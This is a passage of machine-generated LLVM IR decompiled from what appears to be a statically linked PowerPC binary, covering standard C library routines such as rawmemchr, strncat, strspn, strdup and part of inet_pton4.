  %v2_10009a04 = inttoptr i32 %v1_10009a04 to i32*
  %v3_10009a04 = load i32, i32* %v2_10009a04, align 4
  store i32 268474892, i32* @lr, align 4
  %v4_10009a08 = call i32 @__libc_lseek64(i32 %v3_100099fc, i32 %v2_10009a00, i32 %v3_10009a04, i32 %arg3)
  %v1_10009a0c = icmp slt i32 %v4_10009a08, 0
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br i1 %v1_10009a0c, label %dec_label_pc_10009a24, label %dec_label_pc_10009a18

dec_label_pc_10009a18:                            ; preds = %entry
  %v1_10009a18 = load i32, i32* @r31, align 4
  %v2_10009a18 = inttoptr i32 %v1_10009a18 to i32*
  store i32 %v4_10009a08, i32* %v2_10009a18, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10009a20 = load i32, i32* @r31, align 4
  %v2_10009a20 = add i32 %v1_10009a20, 4
  %v3_10009a20 = inttoptr i32 %v2_10009a20 to i32*
  store i32 %tmp, i32* %v3_10009a20, align 4
  %v0_10009a24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10009a24

dec_label_pc_10009a24:                            ; preds = %entry, %dec_label_pc_10009a18
  %v0_10009a24 = phi i32 [ %tmp, %entry ], [ %v0_10009a24.pre, %dec_label_pc_10009a18 ]
  store i32 %v0_100099e8, i32* %r0.global-to-local, align 4
  store i32 %v0_100099f0, i32* @r31, align 4
  ret i32 %v0_10009a24

; uselistorder directives
  uselistorder i32 %tmp, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_10009a24, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_10009a3c = urem i32 %arg1, 256
  store i32 %v1_10009a3c, i32* %r4.global-to-local, align 4
  %v0_10009a541 = load i32, i32* @r3, align 4
  %v1_10009a542 = urem i32 %v0_10009a541, 4
  %v3_10009a544 = icmp eq i32 %v1_10009a542, 0
  br i1 %v3_10009a544, label %dec_label_pc_10009a5c, label %dec_label_pc_10009a44

dec_label_pc_10009a44:                            ; preds = %entry, %dec_label_pc_10009a44
  %v1_10009a48 = phi i32 [ %v0_10009a5c.pre, %dec_label_pc_10009a44 ], [ %v1_10009a3c, %entry ]
  %v0_10009a44 = phi i32 [ %v1_10009a50, %dec_label_pc_10009a44 ], [ %v0_10009a541, %entry ]
  %v1_10009a44 = inttoptr i32 %v0_10009a44 to i8*
  %v2_10009a44 = load i8, i8* %v1_10009a44, align 1
  %v3_10009a44 = zext i8 %v2_10009a44 to i32
  %v4_10009a48 = icmp eq i32 %v3_10009a44, %v1_10009a48
  %v0_10009a4c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10009a48, i32 %v0_10009a4c)
  %v0_10009a50 = load i32, i32* @r3, align 4
  %v1_10009a50 = add i32 %v0_10009a50, 1
  store i32 %v1_10009a50, i32* @r3, align 4
  %v1_10009a54 = urem i32 %v1_10009a50, 4
  %v3_10009a54 = icmp eq i32 %v1_10009a54, 0
  %v0_10009a5c.pre = load i32, i32* %r4.global-to-local, align 4
  br i1 %v3_10009a54, label %dec_label_pc_10009a5c, label %dec_label_pc_10009a44

dec_label_pc_10009a5c:                            ; preds = %dec_label_pc_10009a44, %entry
  %v0_10009a749 = phi i32 [ %v0_10009a541, %entry ], [ %v1_10009a50, %dec_label_pc_10009a44 ]
  %v0_10009a5c = phi i32 [ %v1_10009a3c, %entry ], [ %v0_10009a5c.pre, %dec_label_pc_10009a44 ]
  %v1_10009a5c = mul i32 %v0_10009a5c, 256
  %v2_10009a64 = or i32 %v1_10009a5c, %v0_10009a5c
  %v1_10009a6c = mul i32 %v2_10009a64, 65536
  %v2_10009a70 = or i32 %v1_10009a6c, %v2_10009a64
  br label %dec_label_pc_10009a74

dec_label_pc_10009a74:                            ; preds = %dec_label_pc_10009ae0, %dec_label_pc_10009a74, %dec_label_pc_10009a5c
  %v0_10009ab0 = phi i32 [ %v0_10009a749, %dec_label_pc_10009a5c ], [ %v1_10009a78, %dec_label_pc_10009a74 ], [ %v1_10009a78, %dec_label_pc_10009ae0 ]
  %v1_10009a74 = inttoptr i32 %v0_10009ab0 to i32*
  %v2_10009a74 = load i32, i32* %v1_10009a74, align 4
  %v1_10009a78 = add i32 %v0_10009ab0, 4
  %v2_10009a80 = xor i32 %v2_10009a74, %v2_10009a70
  %v1_10009a88 = add i32 %v2_10009a80, 2130640639
  %v2_10009a8c = xor i32 %v1_10009a88, %v2_10009a80
  %v1_10009a90 = add i32 %v0_10009ab0, 1
  %v2_10009a94 = and i32 %v2_10009a8c, -2130640640
  %v6_10009a94 = icmp eq i32 %v2_10009a94, -2130640640
  br i1 %v6_10009a94, label %dec_label_pc_10009a74, label %dec_label_pc_10009a9c

dec_label_pc_10009a9c:                            ; preds = %dec_label_pc_10009a74
  %v2_10009a9c = inttoptr i32 %v0_10009ab0 to i8*
  %v3_10009a9c = load i8, i8* %v2_10009a9c, align 1
  %v4_10009a9c = zext i8 %v3_10009a9c to i32
  %v1_10009aa0 = add i32 %v0_10009ab0, 3
  %v1_10009aa4 = add i32 %v0_10009ab0, 2
  %v4_10009aa8 = icmp eq i32 %v4_10009a9c, %v0_10009a5c
  br i1 %v4_10009aa8, label %dec_label_pc_10009ab0, label %dec_label_pc_10009ab8

dec_label_pc_10009ab0:                            ; preds = %dec_label_pc_10009a9c
  ret i32 %v0_10009ab0

dec_label_pc_10009ab8:                            ; preds = %dec_label_pc_10009a9c
  %v2_10009ab8 = inttoptr i32 %v1_10009a90 to i8*
  %v3_10009ab8 = load i8, i8* %v2_10009ab8, align 1
  %v4_10009ab8 = zext i8 %v3_10009ab8 to i32
  %v4_10009abc = icmp eq i32 %v4_10009ab8, %v0_10009a5c
  br i1 %v4_10009abc, label %dec_label_pc_10009ac4, label %dec_label_pc_10009acc

dec_label_pc_10009ac4:                            ; preds = %dec_label_pc_10009ab8
  ret i32 %v1_10009a90

dec_label_pc_10009acc:                            ; preds = %dec_label_pc_10009ab8
  %v2_10009acc = inttoptr i32 %v1_10009aa4 to i8*
  %v3_10009acc = load i8, i8* %v2_10009acc, align 1
  %v4_10009acc = zext i8 %v3_10009acc to i32
  %v4_10009ad0 = icmp eq i32 %v4_10009acc, %v0_10009a5c
  br i1 %v4_10009ad0, label %dec_label_pc_10009ad8, label %dec_label_pc_10009ae0

dec_label_pc_10009ad8:                            ; preds = %dec_label_pc_10009acc
  ret i32 %v1_10009aa4

dec_label_pc_10009ae0:                            ; preds = %dec_label_pc_10009acc
  %v2_10009ae0 = inttoptr i32 %v1_10009aa0 to i8*
  %v3_10009ae0 = load i8, i8* %v2_10009ae0, align 1
  %v4_10009ae0 = zext i8 %v3_10009ae0 to i32
  %v4_10009ae4 = icmp eq i32 %v4_10009ae0, %v0_10009a5c
  br i1 %v4_10009ae4, label %dec_label_pc_10009aec, label %dec_label_pc_10009a74

dec_label_pc_10009aec:                            ; preds = %dec_label_pc_10009ae0
  ret i32 %v1_10009aa0

; uselistorder directives
  uselistorder i32 %v1_10009a78, { 1, 0 }
  uselistorder i32 %v0_10009ab0, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v2_10009a64, { 1, 0 }
  uselistorder i32 %v0_10009a5c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_10009a50, { 1, 0, 3, 2 }
  uselistorder i32 %v0_10009a541, { 2, 1, 0 }
  uselistorder i32 %v1_10009a3c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009a44, { 1, 0 }
}

define i32 @__GI_strncat(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r12.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009af8

dec_label_pc_10009af8:                            ; preds = %dec_label_pc_10009af8, %entry
  %v0_10009af8 = phi i32 [ %v1_10009afc, %dec_label_pc_10009af8 ], [ %tmp, %entry ]
  %v1_10009af8 = inttoptr i32 %v0_10009af8 to i8*
  %v2_10009af8 = load i8, i8* %v1_10009af8, align 1
  %v1_10009afc = add i32 %v0_10009af8, 1
  store i32 %v1_10009afc, i32* %r11.global-to-local, align 4
  %v3_10009b00 = icmp eq i8 %v2_10009af8, 0
  store i1 %v3_10009b00, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10009b00, label %dec_label_pc_10009b08, label %dec_label_pc_10009af8

dec_label_pc_10009b08:                            ; preds = %dec_label_pc_10009af8
  %v3_10009b08 = icmp eq i32 %arg2, 3
  store i1 %v3_10009b08, i1* %cr7_eq.global-to-local, align 1
  %v1_10009b0c = add i32 %v0_10009af8, -1
  store i32 %v1_10009b0c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %tmp8 = icmp ult i32 %arg2, 4
  br i1 %tmp8, label %dec_label_pc_10009ba8, label %dec_label_pc_10009b18

dec_label_pc_10009b18:                            ; preds = %dec_label_pc_10009b08
  %v1_10009b18 = udiv i32 %arg2, 4
  store i32 %v1_10009b18, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10009b20

dec_label_pc_10009b20:                            ; preds = %dec_label_pc_10009b20.dec_label_pc_10009b20_crit_edge, %dec_label_pc_10009b18
  %v2_10009b30 = phi i32 [ %v0_10009b24.pre, %dec_label_pc_10009b20.dec_label_pc_10009b20_crit_edge ], [ %v1_10009b0c, %dec_label_pc_10009b18 ]
  %v0_10009b20 = load i32, i32* @r4, align 4
  %v1_10009b20 = inttoptr i32 %v0_10009b20 to i8*
  %v2_10009b20 = load i8, i8* %v1_10009b20, align 1
  %v1_10009b24 = add i32 %v2_10009b30, 1
  store i32 %v1_10009b24, i32* %r7.global-to-local, align 4
  %v1_10009b28 = add i32 %v0_10009b20, 1
  store i32 %v1_10009b28, i32* %r6.global-to-local, align 4
  %v3_10009b2c = icmp eq i8 %v2_10009b20, 0
  store i1 %v3_10009b2c, i1* %cr7_eq.global-to-local, align 1
  %v4_10009b30 = inttoptr i32 %v1_10009b24 to i8*
  store i8 %v2_10009b20, i8* %v4_10009b30, align 1
  %v0_10009b34 = load i32, i32* @lr, align 4
  %v1_10009b34 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b34, i32 %v0_10009b34)
  %v0_10009b38 = load i32, i32* @r4, align 4
  %v1_10009b38 = add i32 %v0_10009b38, 1
  %v2_10009b38 = inttoptr i32 %v1_10009b38 to i8*
  %v3_10009b38 = load i8, i8* %v2_10009b38, align 1
  %v0_10009b3c = load i32, i32* %r6.global-to-local, align 4
  %v1_10009b3c = add i32 %v0_10009b3c, 1
  store i32 %v1_10009b3c, i32* %r8.global-to-local, align 4
  %v0_10009b40 = load i32, i32* %r7.global-to-local, align 4
  %v1_10009b40 = add i32 %v0_10009b40, 1
  store i32 %v1_10009b40, i32* %r10.global-to-local, align 4
  %v1_10009b44 = add i32 %v0_10009b3c, 2
  store i32 %v1_10009b44, i32* %r9.global-to-local, align 4
  %v1_10009b48 = add i32 %v0_10009b40, 2
  store i32 %v1_10009b48, i32* %r12.global-to-local, align 4
  %v1_10009b4c = add i32 %v0_10009b3c, 3
  store i32 %v1_10009b4c, i32* @r4, align 4
  %v3_10009b50 = icmp eq i8 %v3_10009b38, 0
  store i1 %v3_10009b50, i1* %cr7_eq.global-to-local, align 1
  %v4_10009b54 = inttoptr i32 %v1_10009b40 to i8*
  store i8 %v3_10009b38, i8* %v4_10009b54, align 1
  %v0_10009b58 = load i32, i32* @lr, align 4
  %v1_10009b58 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b58, i32 %v0_10009b58)
  %v0_10009b5c = load i32, i32* %r6.global-to-local, align 4
  %v1_10009b5c = add i32 %v0_10009b5c, 1
  %v2_10009b5c = inttoptr i32 %v1_10009b5c to i8*
  %v3_10009b5c = load i8, i8* %v2_10009b5c, align 1
  %v0_10009b60 = load i32, i32* %r12.global-to-local, align 4
  %v1_10009b60 = add i32 %v0_10009b60, 1
  store i32 %v1_10009b60, i32* %r11.global-to-local, align 4
  %v3_10009b64 = icmp eq i8 %v3_10009b5c, 0
  store i1 %v3_10009b64, i1* %cr7_eq.global-to-local, align 1
  %v2_10009b68 = load i32, i32* %r10.global-to-local, align 4
  %v3_10009b68 = add i32 %v2_10009b68, 1
  %v4_10009b68 = inttoptr i32 %v3_10009b68 to i8*
  store i8 %v3_10009b5c, i8* %v4_10009b68, align 1
  %v0_10009b6c = load i32, i32* @lr, align 4
  %v1_10009b6c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b6c, i32 %v0_10009b6c)
  %v0_10009b70 = load i32, i32* %r8.global-to-local, align 4
  %v1_10009b70 = add i32 %v0_10009b70, 1
  %v2_10009b70 = inttoptr i32 %v1_10009b70 to i8*
  %v3_10009b70 = load i8, i8* %v2_10009b70, align 1
  %v4_10009b70 = zext i8 %v3_10009b70 to i32
  store i32 %v4_10009b70, i32* %r9.global-to-local, align 4
  %v3_10009b74 = icmp eq i8 %v3_10009b70, 0
  store i1 %v3_10009b74, i1* %cr7_eq.global-to-local, align 1
  %v2_10009b78 = load i32, i32* %r12.global-to-local, align 4
  %v3_10009b78 = add i32 %v2_10009b78, 1
  %v4_10009b78 = inttoptr i32 %v3_10009b78 to i8*
  store i8 %v3_10009b70, i8* %v4_10009b78, align 1
  %v0_10009b7c = load i32, i32* @lr, align 4
  %v1_10009b7c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009b7c, i32 %v0_10009b7c)
  %v0_10009b80 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009b80 = add i32 %v0_10009b80, -1
  store i32 %v1_10009b80, i32* %ctr.global-to-local, align 4
  %v2_10009b80 = icmp eq i32 %v1_10009b80, 0
  br i1 %v2_10009b80, label %dec_label_pc_10009b84, label %dec_label_pc_10009b20.dec_label_pc_10009b20_crit_edge

dec_label_pc_10009b20.dec_label_pc_10009b20_crit_edge: ; preds = %dec_label_pc_10009b20
  %v0_10009b24.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009b20

dec_label_pc_10009b84:                            ; preds = %dec_label_pc_10009b20
  %v0_10009b84 = load i32, i32* %r5.global-to-local, align 4
  %v1_10009b84 = urem i32 %v0_10009b84, 4
  store i32 %v1_10009b84, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009ba8

dec_label_pc_10009b8c:                            ; preds = %dec_label_pc_10009ba8, %dec_label_pc_10009b8c.dec_label_pc_10009b8c_crit_edge
  %v0_10009b90 = phi i32 [ %v0_10009b90.pre, %dec_label_pc_10009b8c.dec_label_pc_10009b8c_crit_edge ], [ %v0_10009ba8, %dec_label_pc_10009ba8 ]
  %v0_10009b8c = load i32, i32* @r4, align 4
  %v1_10009b8c = inttoptr i32 %v0_10009b8c to i8*
  %v2_10009b8c = load i8, i8* %v1_10009b8c, align 1
  %v3_10009b8c = zext i8 %v2_10009b8c to i32
  store i32 %v3_10009b8c, i32* %r9.global-to-local, align 4
  %v1_10009b90 = add i32 %v0_10009b90, -1
  store i32 %v1_10009b90, i32* %r5.global-to-local, align 4
  %v1_10009b94 = add i32 %v0_10009b8c, 1
  store i32 %v1_10009b94, i32* @r4, align 4
  %v3_10009b98 = icmp eq i8 %v2_10009b8c, 0
  store i1 %v3_10009b98, i1* %cr7_eq.global-to-local, align 1
  %v2_10009b9c = load i32, i32* %r11.global-to-local, align 4
  %v3_10009b9c = add i32 %v2_10009b9c, 1
  %v4_10009b9c = inttoptr i32 %v3_10009b9c to i8*
  store i8 %v2_10009b8c, i8* %v4_10009b9c, align 1
  store i32 %v3_10009b9c, i32* %r11.global-to-local, align 4
  %v0_10009ba0 = load i32, i32* @lr, align 4
  %v1_10009ba0 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_10009ba0, i32 %v0_10009ba0)
  %v0_10009bb0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009bb0 = add i32 %v0_10009bb0, -1
  store i32 %v1_10009bb0, i32* %ctr.global-to-local, align 4
  %v2_10009bb0 = icmp eq i32 %v1_10009bb0, 0
  br i1 %v2_10009bb0, label %dec_label_pc_10009bb4, label %dec_label_pc_10009b8c.dec_label_pc_10009b8c_crit_edge

dec_label_pc_10009b8c.dec_label_pc_10009b8c_crit_edge: ; preds = %dec_label_pc_10009b8c
  %v0_10009b90.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10009b8c

dec_label_pc_10009ba8:                            ; preds = %dec_label_pc_10009b08, %dec_label_pc_10009b84
  %v0_10009ba8 = phi i32 [ %arg2, %dec_label_pc_10009b08 ], [ %v1_10009b84, %dec_label_pc_10009b84 ]
  store i32 %v0_10009ba8, i32* %ctr.global-to-local, align 4
  %v2_10009bb03 = icmp eq i32 %v0_10009ba8, 0
  br i1 %v2_10009bb03, label %dec_label_pc_10009bb4, label %dec_label_pc_10009b8c

dec_label_pc_10009bb4:                            ; preds = %dec_label_pc_10009b8c, %dec_label_pc_10009ba8
  %v0_10009bb4 = load i32, i32* %r9.global-to-local, align 4
  %v3_10009bb4 = icmp eq i32 %v0_10009bb4, 0
  store i1 %v3_10009bb4, i1* %cr7_eq.global-to-local, align 1
  %v0_10009bb8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10009bb4, i32 %v0_10009bb8)
  %v0_10009bbc = load i32, i32* %r5.global-to-local, align 4
  %v1_10009bbc = trunc i32 %v0_10009bbc to i8
  %v2_10009bbc = load i32, i32* %r11.global-to-local, align 4
  %v3_10009bbc = add i32 %v2_10009bbc, 1
  %v4_10009bbc = inttoptr i32 %v3_10009bbc to i8*
  store i8 %v1_10009bbc, i8* %v4_10009bbc, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_10009ba8, { 1, 2, 0 }
  uselistorder i32 %v1_10009bb0, { 1, 0 }
  uselistorder i32 %v1_10009b84, { 1, 0 }
  uselistorder i32 %v1_10009b80, { 1, 0 }
  uselistorder i32 %v1_10009afc, { 1, 0 }
  uselistorder i32 %v0_10009af8, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_10009bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10009ba8, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_10009bf41 = load i32, i32* @r3, align 4
  %v1_10009bf42 = inttoptr i32 %v0_10009bf41 to i8*
  %v2_10009bf43 = load i8, i8* %v1_10009bf42, align 1
  %v3_10009bf86 = icmp eq i8 %v2_10009bf43, 0
  br i1 %v3_10009bf86, label %dec_label_pc_10009c08, label %dec_label_pc_10009c00

dec_label_pc_10009bd0:                            ; preds = %dec_label_pc_10009bd0, %dec_label_pc_10009c00
  %v0_10009bd0 = phi i32 [ %v1_10009bd4, %dec_label_pc_10009bd0 ], [ %tmp, %dec_label_pc_10009c00 ]
  %v1_10009bd0 = inttoptr i32 %v0_10009bd0 to i8*
  %v2_10009bd0 = load i8, i8* %v1_10009bd0, align 1
  %v1_10009bd4 = add i32 %v0_10009bd0, 1
  %v3_10009bd8 = icmp eq i8 %v2_10009bd0, 0
  %v4_10009bdc = icmp eq i8 %v0_10009bdc8.in, %v2_10009bd0
  %brmerge = or i1 %v3_10009bd8, %v4_10009bdc
  br i1 %brmerge, label %dec_label_pc_10009be4, label %dec_label_pc_10009bd0

dec_label_pc_10009be4:                            ; preds = %dec_label_pc_10009bd0
  br i1 %v3_10009bd8, label %dec_label_pc_10009c08, label %dec_label_pc_10009bec

dec_label_pc_10009bec:                            ; preds = %dec_label_pc_10009be4
  %v1_10009bec = add i32 %v0_10009bec, 1
  %v1_10009bf0 = add i32 %v0_10009bf0, 1
  %v1_10009bf4 = inttoptr i32 %v1_10009bf0 to i8*
  %v2_10009bf4 = load i8, i8* %v1_10009bf4, align 1
  %v3_10009bf8 = icmp eq i8 %v2_10009bf4, 0
  br i1 %v3_10009bf8, label %dec_label_pc_10009c08, label %dec_label_pc_10009c00

dec_label_pc_10009c00:                            ; preds = %entry, %dec_label_pc_10009bec
  %v0_10009bf0 = phi i32 [ %v1_10009bf0, %dec_label_pc_10009bec ], [ %v0_10009bf41, %entry ]
  %v0_10009bec = phi i32 [ %v1_10009bec, %dec_label_pc_10009bec ], [ 0, %entry ]
  %v0_10009bdc8.in = phi i8 [ %v2_10009bf4, %dec_label_pc_10009bec ], [ %v2_10009bf43, %entry ]
  br label %dec_label_pc_10009bd0

dec_label_pc_10009c08:                            ; preds = %dec_label_pc_10009bec, %dec_label_pc_10009be4, %entry
  %v0_10009c08 = phi i32 [ 0, %entry ], [ %v1_10009bec, %dec_label_pc_10009bec ], [ %v0_10009bec, %dec_label_pc_10009be4 ]
  ret i32 %v0_10009c08

; uselistorder directives
  uselistorder i32 %v0_10009bd0, { 1, 0 }
  uselistorder label %dec_label_pc_10009c00, { 1, 0 }
  uselistorder label %dec_label_pc_10009bd0, { 1, 0 }
}

define i32 @__GI_strdup(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  %v0_10009c24 = call i32 @__GI_strlen()
  %v1_10009c28 = add i32 %v0_10009c24, 1
  store i32 %v1_10009c28, i32* @r29, align 4
  store i32 %v1_10009c28, i32* @r3, align 4
  store i32 268475444, i32* @lr, align 4
  %v0_10009c30 = call i32 @malloc()
  store i32 %v0_10009c30, i32* @r3, align 4
  %v0_10009c34 = load i32, i32* @r28, align 4
  store i32 %v0_10009c34, i32* @r4, align 4
  store i32 %v0_10009c30, i32* @r31, align 4
  %v3_10009c38 = icmp eq i32 %v0_10009c30, 0
  %v0_10009c3c = load i32, i32* @r29, align 4
  store i32 %v0_10009c3c, i32* @r5, align 4
  br i1 %v3_10009c38, label %dec_label_pc_10009c48, label %dec_label_pc_10009c44

dec_label_pc_10009c44:                            ; preds = %entry
  store i32 268475464, i32* @lr, align 4
  %v0_10009c44 = call i32 @memcpy()
  %v0_10009c4c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009c48

dec_label_pc_10009c48:                            ; preds = %entry, %dec_label_pc_10009c44
  %v0_10009c4c = phi i32 [ 0, %entry ], [ %v0_10009c4c.pre, %dec_label_pc_10009c44 ]
  ret i32 %v0_10009c4c

; uselistorder directives
  uselistorder i32 ()* @malloc, { 5, 2, 1, 12, 11, 4, 3, 10, 9, 8, 0, 7, 6 }
  uselistorder label %dec_label_pc_10009c48, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10009c68 = call i32 @__asm_mfcr()
  store i32 %v0_10009c68, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_10009c7c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_10009c7c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10009ce0

dec_label_pc_10009c90:                            ; preds = %dec_label_pc_10009ce0
  %v1_10009cf4 = add i32 %v0_10009cf0, -48
  %v2_10009cf8 = icmp ugt i32 %v1_10009cf4, 9
  br i1 %v2_10009cf8, label %dec_label_pc_10009ccc, label %dec_label_pc_10009c98

dec_label_pc_10009c98:                            ; preds = %dec_label_pc_10009c90
  %v0_10009c98 = load i32, i32* %r7.global-to-local, align 4
  %v1_10009c98 = inttoptr i32 %v0_10009c98 to i8*
  %v2_10009c98 = load i8, i8* %v1_10009c98, align 1
  %v3_10009c98 = zext i8 %v2_10009c98 to i32
  %v1_10009c9c = mul nuw nsw i32 %v3_10009c98, 10
  %v2_10009ca0 = add i32 %v1_10009c9c, %v0_10009cf0
  %v1_10009ca4 = add i32 %v2_10009ca0, -48
  %v2_10009ca8 = icmp ugt i32 %v1_10009ca4, 255
  br i1 %v2_10009ca8, label %dec_label_pc_10009d28, label %dec_label_pc_10009cb0

dec_label_pc_10009cb0:                            ; preds = %dec_label_pc_10009c98
  %v1_10009cb0 = trunc i32 %v1_10009ca4 to i8
  store i8 %v1_10009cb0, i8* %v1_10009c98, align 1
  %v0_10009cb4 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_10009cb4, label %dec_label_pc_10009cb8, label %dec_label_pc_10009ce0.backedge

dec_label_pc_10009cb8:                            ; preds = %dec_label_pc_10009cb0
  %v0_10009cb8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10009cb8 = add i32 %v0_10009cb8, 1
  store i32 %v1_10009cb8, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_10009cc0 = icmp sgt i32 %v1_10009cb8, 4
  br i1 %v2_10009cc0, label %dec_label_pc_10009d28, label %dec_label_pc_10009ce0.backedge

dec_label_pc_10009ccc:                            ; preds = %dec_label_pc_10009c90
  %v3_10009c90 = icmp eq i32 %v0_10009d04, 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_10009cfc.not = icmp ne i32 %v0_10009cf0, 46
  %v0_10009cd4 = load i1, i1* %cr0_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10009c90, %v0_10009cd4
  %or.cond = or i1 %v3_10009cfc.not, %brmerge
  br i1 %or.cond, label %dec_label_pc_10009d28, label %dec_label_pc_10009cdc

dec_label_pc_10009cdc:                            ; preds = %dec_label_pc_10009ccc
  %v0_10009cdc = load i32, i32* %r6.global-to-local, align 4
  %v1_10009cdc = trunc i32 %v0_10009cdc to i8
  %v2_10009cdc = load i32, i32* %r7.global-to-local, align 4
  %v3_10009cdc = add i32 %v2_10009cdc, 1
  %v4_10009cdc = inttoptr i32 %v3_10009cdc to i8*
  store i8 %v1_10009cdc, i8* %v4_10009cdc, align 1
  store i32 %v3_10009cdc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10009ce0.backedge

dec_label_pc_10009ce0.backedge:                   ; preds = %dec_label_pc_10009cdc, %dec_label_pc_10009cb0, %dec_label_pc_10009cb8
  %v0_10009ce0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10009ce4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10009ce0

dec_label_pc_10009ce0:                            ; preds = %dec_label_pc_10009ce0.backedge, %entry
  %v0_10009ce4 = phi i32 [ %v0_10009ce4.pre, %dec_label_pc_10009ce0.backedge ], [ 0, %entry ]
  %v0_10009ce8 = phi i32 [ %v0_10009ce0.pre, %dec_label_pc_10009ce0.backedge ], [ %v0_10009c68, %entry ]
  %v1_10009ce0 = inttoptr i32 %v0_10009ce8 to i8*
  %v2_10009ce0 = load i8, i8* %v1_10009ce0, align 1
  %v3_10009ce0 = zext i8 %v2_10009ce0 to i32
  store i32 %v3_10009ce0, i32* %r11.global-to-local, align 4
  %v1_10009ce4 = icmp slt i32 %v0_10009ce4, 0
  %v2_10009ce4 = icmp sgt i32 %v0_10009ce4, 0
  %v3_10009ce4 = icmp eq i32 %v0_10009ce4, 0
  store i1 %v3_10009ce4, i1* %cr0_eq.global-to-local, align 1
  %v1_10009ce8 = add i32 %v0_10009ce8, 1
  store i32 %v1_10009ce8, i32* %r3.global-to-local, align 4
  %v4_10009cec = call i4 @__asm_mcrf_cr0_read(i1 %v1_10009ce4, i1 %v2_10009ce4, i1 %v3_10009ce4, i1 false)
  %v0_10009cf0 = load i32, i32* %r11.global-to-local, align 4
  %v3_10009cf0 = icmp eq i32 %v0_10009cf0, 0
  %v0_10009d04 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_10009cf0, label %dec_label_pc_10009d04, label %dec_label_pc_10009c90

dec_label_pc_10009d04:                            ; preds = %dec_label_pc_10009ce0
  %tmp9 = icmp slt i32 %v0_10009d04, 4
  br i1 %tmp9, label %dec_label_pc_10009d28, label %dec_label_pc_10009d0c

dec_label_pc_10009d0c:                            ; preds = %dec_label_pc_10009d04
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_10009c7c, i32* @r4, align 4
